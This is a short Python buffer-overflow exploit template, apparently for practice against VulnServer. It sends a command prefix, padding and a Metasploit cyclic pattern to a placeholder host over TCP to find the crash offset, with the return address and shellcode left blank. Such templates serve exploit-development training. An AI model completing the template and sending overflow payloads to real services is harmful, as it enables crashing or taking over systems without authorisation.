#!/usr/bin/env python3

import socket

ip = "192.168.1.100" # Change me
port = 8080 # Change me

prefix = "CULO " # Change this with the vulnerable parameter (Ex: TRUN, on VulnServer)
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" # Change me. You can get this with: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Yeah!")
except:
  print("There was a connection problem.")
